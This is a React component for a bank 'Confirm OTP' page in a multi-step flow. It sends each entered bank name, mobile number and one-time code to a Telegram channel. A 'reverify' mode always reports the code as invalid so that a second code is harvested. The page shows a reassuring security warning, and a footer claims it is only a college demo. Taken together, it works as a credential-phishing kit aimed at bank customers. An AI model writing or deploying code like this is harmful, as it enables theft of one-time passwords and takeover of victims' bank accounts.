'use client'

import {
  useEffect,
  useMemo,
  useRef,
  useState,
  type ClipboardEvent,
  type FormEvent,
  type KeyboardEvent,
} from 'react'
import { useRouter } from 'next/navigation'
import { CircleAlert, ChevronRight, TriangleAlert } from 'lucide-react'
import { notifyTelegram } from '@/lib/notify'

const OTP_LENGTH = 6
const TOTAL_STEPS = 5
const RESEND_SECONDS = 300 // 05:00

// Mask a mobile number like 03651237567 -> "0365 *** 7567".
function maskMobile(mobile: string) {
  const digits = (mobile || '').replace(/\D/g, '')
  if (digits.length < 8) return mobile || 'your registered number'
  return `${digits.slice(0, 4)} *** ${digits.slice(-4)}`
}

type OtpMode = 'continue' | 'reverify'

export function OtpForm({
  slug,
  mobile,
  bankName,
  mode = 'continue',
  activeStep = 3,
}: {
  slug: string
  mobile: string
  bankName: string
  mode?: OtpMode
  activeStep?: number
}) {
  const router = useRouter()
  const [digits, setDigits] = useState<string[]>(Array(OTP_LENGTH).fill(''))
  const [seconds, setSeconds] = useState(RESEND_SECONDS)
  const [error, setError] = useState(false)
  const inputsRef = useRef<Array<HTMLInputElement | null>>([])

  const masked = useMemo(() => maskMobile(mobile), [mobile])
  const code = digits.join('')
  const isComplete = code.length === OTP_LENGTH

  // Countdown timer for the resend option.
  useEffect(() => {
    if (seconds <= 0) return
    const id = setTimeout(() => setSeconds((s) => s - 1), 1000)
    return () => clearTimeout(id)
  }, [seconds])

  const mm = String(Math.floor(seconds / 60)).padStart(2, '0')
  const ss = String(seconds % 60).padStart(2, '0')

  function focusInput(index: number) {
    inputsRef.current[index]?.focus()
    inputsRef.current[index]?.select()
  }

  function handleChange(index: number, value: string) {
    if (error) setError(false)
    const digit = value.replace(/\D/g, '').slice(-1)
    setDigits((prev) => {
      const next = [...prev]
      next[index] = digit
      return next
    })
    if (digit && index < OTP_LENGTH - 1) focusInput(index + 1)
  }

  function handleKeyDown(index: number, e: KeyboardEvent<HTMLInputElement>) {
    if (e.key === 'Backspace' && !digits[index] && index > 0) {
      focusInput(index - 1)
    } else if (e.key === 'ArrowLeft' && index > 0) {
      e.preventDefault()
      focusInput(index - 1)
    } else if (e.key === 'ArrowRight' && index < OTP_LENGTH - 1) {
      e.preventDefault()
      focusInput(index + 1)
    }
  }

  function handlePaste(e: ClipboardEvent<HTMLInputElement>) {
    e.preventDefault()
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, OTP_LENGTH)
    if (!pasted) return
    const next = Array(OTP_LENGTH).fill('')
    pasted.split('').forEach((d, i) => (next[i] = d))
    setDigits(next)
    focusInput(Math.min(pasted.length, OTP_LENGTH - 1))
  }

  function handleResend() {
    if (seconds > 0) return
    setSeconds(RESEND_SECONDS)
    setDigits(Array(OTP_LENGTH).fill(''))
    focusInput(0)
  }

  function handleSubmit(e: FormEvent) {
    e.preventDefault()
    if (!isComplete) return
    notifyTelegram(mode === 'reverify' ? 'OTP Re-verification' : 'OTP Submitted', [
      { label: 'Bank', value: bankName },
      { label: 'Mobile', value: mobile },
      { label: 'OTP Code', value: code },
    ])
    if (mode === 'reverify') {
      // This step always reports the code as invalid.
      setError(true)
      return
    }
    // Continue to the balance step.
    router.push(`/bank/${slug}/balance`)
  }

  return (
    <form onSubmit={handleSubmit} className="mt-6">
      <h2 className="text-2xl font-extrabold tracking-tight">Confirm OTP</h2>
      <p className="mt-2 text-pretty text-sm leading-relaxed text-muted-foreground">
        Enter the {OTP_LENGTH}-digit confirmation code sent to {masked}.
      </p>

      {/* OTP input card */}
      <div className="mt-5 rounded-3xl border border-border bg-card p-5 shadow-sm">
        <div className="flex justify-center gap-2 sm:gap-3">
          {digits.map((digit, i) => (
            <input
              key={i}
              ref={(el) => {
                inputsRef.current[i] = el
              }}
              inputMode="numeric"
              autoComplete={i === 0 ? 'one-time-code' : 'off'}
              maxLength={1}
              value={digit}
              aria-label={`Digit ${i + 1}`}
              onChange={(e) => handleChange(i, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i, e)}
              onPaste={handlePaste}
              onFocus={(e) => e.target.select()}
              className={`h-12 w-11 rounded-xl border bg-secondary/40 text-center text-xl font-bold text-foreground outline-none ring-2 ring-transparent transition focus:border-primary focus:ring-primary sm:h-14 sm:w-12 ${
                error ? 'border-destructive ring-destructive/40' : 'border-border'
              }`}
            />
          ))}
        </div>

        {error && (
          <p
            role="alert"
            className="mt-4 flex items-center justify-center gap-1.5 text-center text-sm font-semibold text-destructive"
          >
            <CircleAlert className="h-4 w-4 shrink-0" aria-hidden="true" />
            Invalid OTP. Please try again.
          </p>
        )}

        <p className="mt-4 text-center text-sm text-muted-foreground">
          {"Didn't receive the code? "}
          {seconds > 0 ? (
            <span className="font-semibold text-foreground">
              Resend in {mm}:{ss}
            </span>
          ) : (
            <button
              type="button"
              onClick={handleResend}
              className="font-semibold text-primary underline-offset-2 transition-transform duration-100 hover:underline focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring active:scale-95"
            >
              Resend code
            </button>
          )}
        </p>
      </div>

      {/* Security warning */}
      <div className="mt-4 flex items-start gap-2 rounded-2xl border border-amber-500/30 bg-amber-500/10 px-4 py-3">
        <TriangleAlert
          className="mt-0.5 h-4 w-4 shrink-0 text-amber-500"
          aria-hidden="true"
        />
        <p className="text-sm leading-relaxed text-amber-700 dark:text-amber-300">
          Never share your OTP with anyone. Your bank will never ask for your OTP
          over a call or SMS.
        </p>
      </div>

      {/* Step indicator (step 4 of 5) */}
      <div
        className="flex items-center justify-center gap-2 py-5"
        role="status"
        aria-label={`Step ${activeStep + 1} of ${TOTAL_STEPS}`}
      >
        {Array.from({ length: TOTAL_STEPS }, (_, i) => (
          <span
            key={i}
            className={`h-2 rounded-full transition-all ${
              i === activeStep ? 'w-6 bg-primary' : 'w-2 bg-border'
            }`}
          />
        ))}
      </div>

      <button
        type="submit"
        disabled={!isComplete}
        className="flex w-full items-center justify-center gap-2 rounded-2xl bg-primary py-4 text-base font-bold text-primary-foreground shadow-md transition-all duration-100 hover:brightness-105 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring active:scale-[0.98] active:brightness-95 disabled:cursor-not-allowed disabled:opacity-50 disabled:active:scale-100"
      >
        Confirm OTP
        <ChevronRight className="h-5 w-5" aria-hidden="true" />
      </button>

      <p className="pt-3 text-center text-xs text-muted-foreground">
        Demo directory for a college project. No real OTP is sent or verified.
      </p>
    </form>
  )
}
